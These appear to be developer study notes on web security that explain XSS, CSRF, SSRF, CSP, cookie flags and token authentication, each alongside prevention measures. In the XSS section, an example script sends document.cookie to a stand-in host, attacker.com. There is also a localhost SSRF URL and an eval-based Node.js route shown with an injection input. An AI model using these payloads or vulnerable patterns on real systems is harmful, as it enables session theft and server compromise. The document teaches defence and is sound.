# Security

## 1. Cross-Site Scripting (XSS)

XSS is a security vulnerability where an attacker injects malicious JavaScript into a website, and that script runs in the browsers of other users who visit the page.

### a) Stored XSS (persistent XSS)

The malicious script is stored in the database and served to every user.

```text
Attacker submits comment
(e.g. <script>fetch("https://attacker.com/steal?cookie=" + document.cookie)</script>)
→ stored in DB
        ↓
Other users load the page
        ↓
Browser executes the malicious script
```

### b) DOM-based XSS

Happens when frontend JavaScript reads user input and inserts it into the DOM without sanitization:

```js
element.innerHTML = userInput;
```

### Prevention

1. **Avoid dangerous DOM APIs:** `element.innerHTML`, `document.write()`, `insertAdjacentHTML()`.
2. **Use framework auto-escaping.** If a comment contains `<script>alert(1)</script>`, React renders it as `&lt;script&gt;alert(1)&lt;/script&gt;`, so the script does not run. Avoid `<div dangerouslySetInnerHTML={{ __html: comment }} />`.
3. **Use HttpOnly cookies.** Even if XSS happens, attackers cannot read cookies via JavaScript:

   ```text
   Set-Cookie: sessionId=abc123; HttpOnly
   ```

   This blocks access through `document.cookie`.
4. **Implement a Content Security Policy (CSP)** to restrict which scripts can execute:

   ```text
   Content-Security-Policy: script-src 'self'
   ```

   This blocks an injected `<script>alert(1)</script>`.

## 2. iFrame protection (clickjacking)

iFrame protection prevents malicious websites from embedding your webpage inside an iframe to perform clickjacking attacks.

```text
User visits attacker website
        ↓
Attacker embeds target website in an iframe
        ↓
Iframe is hidden or transparent
        ↓
User clicks fake UI
        ↓
Real action happens on the embedded website
```

### Prevention

**X-Frame-Options header (most common):**

```text
X-Frame-Options: DENY        → no website can embed this page in an iframe
X-Frame-Options: SAMEORIGIN  → only the same origin can embed it
```

**Content Security Policy (modern solution):**

```text
Content-Security-Policy: frame-ancestors 'none'  → no site can embed this page
Content-Security-Policy: frame-ancestors 'self'  → only allow the same origin (or list specific domains)
```

## 3. Content Security Policy (CSP)

CSP is a browser security mechanism that restricts which resources (scripts, styles, images, etc.) are allowed to load on a webpage. It helps prevent Cross-Site Scripting (XSS), malicious script injection, and data injection attacks.

```text
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' https://fonts.googleapis.com;
  img-src 'self' https://images.example.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  object-src 'none'
```

## 4. CORS

CORS (Cross-Origin Resource Sharing) is a browser security mechanism that allows or restricts web pages from making requests to a different origin than the one that served the page.

**How CORS works:**

```text
Frontend → Browser → API server
GET https://api.example.com/data
Origin: https://app.example.com
Access-Control-Allow-Origin: https://app.example.com

If allowed  → browser gives the response to the frontend
If not allowed → browser blocks it
```

⚠️ **Important:** the server still sends the response — the *browser* blocks it from reaching the page.

**Example of the cross-site risk that these protections address:**

```text
User logs into bank.com
        ↓
Browser stores session cookie
        ↓
User visits evil.com
        ↓
evil.com sends a request to the bank.com API
        ↓
Browser automatically attaches the bank session cookie
        ↓
Bank server thinks the request is from the logged-in user
        ↓
Potential unauthorized action (e.g., money transfer)
        ↓
Security protections stop this:
Same-Origin Policy + CORS + CSRF tokens + SameSite cookies
```

## 5. CSRF (Cross-Site Request Forgery)

CSRF is an attack where a malicious website tricks a logged-in user's browser into sending an unauthorized request to another website. It works because browsers automatically send cookies with requests to the cookie's domain.

```text
User logs into bank.com
        ↓
Browser stores session cookie
        ↓
User visits evil.com
        ↓
evil.com sends a request to bank.com
        ↓
Browser automatically attaches the bank cookie
        ↓
Server thinks the request is from the authenticated user
        ↓
Unauthorized action happens (e.g., money transfer)
```

### Prevention

**1) CSRF token:**

```text
User logs into bank.com
        ↓
Server generates a unique CSRF token
        ↓
Token sent to the frontend (in HTML/meta/API)
        ↓
Frontend includes the token in every sensitive request
        ↓
Server verifies the token before processing the request
        ↓
If the token is missing/invalid → request rejected
```

**2) SameSite cookies**

**3) Checking the Origin / Referer header**

## 6. Server-Side Request Forgery (SSRF)

SSRF is an attack where a malicious user tricks a server into sending requests to internal or external systems, potentially exposing sensitive data or internal services.

Servers sometimes legitimately fetch data from external URLs (image previews, webhook validation, metadata fetches). If the server accepts a user-provided URL without validation, an attacker can make it send requests to unintended locations.

```text
User sends URL input to the server
        ↓
Server fetches the URL
        ↓
Attacker provides a malicious URL
        ↓
Server sends a request to an internal/private service
        ↓
Attacker gains access to sensitive data
```

**Example — server code:** `fetch(imageUrl)`

- Normal request: `imageUrl = https://images.com/photo.jpg`
- Malicious request: `imageUrl = http://localhost:3000/admin`

Attackers often try to reach internal services: `http://localhost`, `http://127.0.0.1`, `http://internal-service`.

**Prevention:** validate URLs properly.

## 7. Server-Side JavaScript Injection (SSJI)

SSJI occurs when user input is executed as JavaScript on the server (e.g., via `eval()`), allowing attackers to run malicious code. Prevent it by avoiding dynamic code execution and validating inputs.

**Vulnerable example (Node.js):**

```js
app.get("/calculate", (req, res) => {
  const result = eval(req.query.expression);
  res.send(result);
});
```

- Normal request: `/calculate?expression=2+2` → server returns `4`.
- Attacker sends: `/calculate?expression=process.exit()` → the server executes malicious code, potentially crashing or exposing sensitive data.

## 8. Subresource Integrity (SRI)

SRI ensures that files loaded from external sources have not been modified, by verifying them against a cryptographic hash before execution.

**How it works:**
1. The developer generates a hash of the file.
2. The hash is added to the HTML tag.
3. The browser downloads the file and calculates its hash.
4. If the hashes match, the file executes; if not, the browser blocks the resource.

## 9. HttpOnly, Secure, and SameSite cookies

**HttpOnly cookie 🔐** — prevents JavaScript from accessing the cookie, protecting it from XSS.

```text
Set-Cookie: sessionId=abc123; HttpOnly
```

Meaning: `document.cookie` cannot read this cookie.

**Secure cookie 🌐** — the cookie is only sent over HTTPS, preventing interception on insecure networks.

```text
Set-Cookie: sessionId=abc123; Secure
```

Meaning: sent only to `https://example.com`, not `http://example.com`.

**SameSite cookie 🛡️** — restricts the cookie from being sent in cross-site requests, helping prevent CSRF.

```text
Set-Cookie: sessionId=abc123; SameSite=Strict
```

Meaning: the cookie is not sent when requests come from another site (e.g., evil.com → bank.com).

**Many applications combine all three:**

```text
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax
```

- `HttpOnly` → JS cannot read the cookie
- `Secure` → sent only via HTTPS
- `SameSite` → protected from CSRF

## 10. Avoid exposing sensitive data

Never include secret keys (API secrets, etc.) in frontend code — the browser environment is public and easily inspectable. Keep secrets on the backend and access external services through secure server APIs.

> ✅ **Frontend security rule:** if the browser can download it, the user can read it.

## 11. Why JWT tokens are stored in cookies (instead of localStorage)

- Protection from XSS (via the `HttpOnly` flag — JS cannot read the token)
- Automatic request handling (browser attaches the cookie)
- `Secure` flag ensures HTTPS-only transmission
- `SameSite` protection (CSRF prevention)
- Easy expiration control
- Server-side control

## 12. Refresh token & access token

Using a single long-lived access token is a major security risk: if an attacker steals it, they can access the user's account for a long time. To reduce this risk, we use a **short-lived access token plus a refresh token**.

```text
User login
    ↓
Access token (15 min)
Refresh token (7 days)
    ↓
API request → access token
    ↓
Access token expires
    ↓
Send refresh token
    ↓
Server issues a new access token
```

## 13. Authentication vs authorization

**Authentication** verifies the identity of a user. **Authorization** determines what actions or resources that authenticated user is allowed to access.

## 14. Session-based / JWT / OAuth authentication

### a) Session-based authentication

The server stores user sessions and identifies users by session ID. Login state lives on the server; the browser stores only a session ID in a cookie.

```text
User login
    ↓
Server verifies credentials
    ↓
Server creates a session in the DB
    ↓
Server sends a session ID cookie
    ↓
Browser sends the session ID with each request
```

Example cookie: `Set-Cookie: sessionId=abc123`. The server stores the mapping `sessionId → user data`.

### b) JWT authentication (token-based)

JWT authentication uses a signed token containing user information, stored on the client and sent with every request.

```text
User login
    ↓
Server verifies credentials
    ↓
Server generates a JWT
    ↓
Client stores the JWT
    ↓
Client sends the token with requests
```

### c) OAuth (third-party authentication)

OAuth allows users to log in using another service without sharing their password.

## 15. Checking the Origin / Referer header

**Origin header** — contains only the domain that initiated the request. If the server detects an invalid origin, the request is blocked.

**Referer header** — contains the full URL of the page that made the request.

```text
Referer: https://mybank.com/account
```

The server checks: does the Referer start with `https://mybank.com`? If yes, allow the request.

## 16. HTTP vs HTTPS

### HTTP (port 80)

HTTP is a protocol for communication between a browser (client) and a server. The problem: HTTP data is sent in **plain text**. If someone intercepts the network (e.g., public WiFi), they can see:

```text
username=rahul
password=123456
```

So HTTP is:
- ❌ Not encrypted
- ❌ Vulnerable to MITM attacks
- ❌ Unsafe for logins and payments

Attackers intercept requests using man-in-the-middle techniques such as packet sniffing on public WiFi, fake hotspots, DNS spoofing, or ARP spoofing — capturing or modifying network traffic.

### HTTPS (port 443)

HTTPS is HTTP + SSL/TLS encryption. It encrypts all communication between the browser and the server.

```text
Browser → TLS handshake → Server
Secure encrypted connection established
Browser ↔ Server (encrypted data)
```

**What TLS (Transport Layer Security) does:**
- Encrypts data
- Ensures data integrity
- Verifies the server's identity using certificates

## 17. JWT login flow

```text
User login
    ↓
Frontend → /login
    ↓
Server verifies credentials
    ↓
Server generates a JWT
    ↓
JWT returned to the frontend
    ↓
Frontend stores the token
    ↓
Client sends the JWT in API requests
    ↓
Server verifies the token
    ↓
Access granted
```
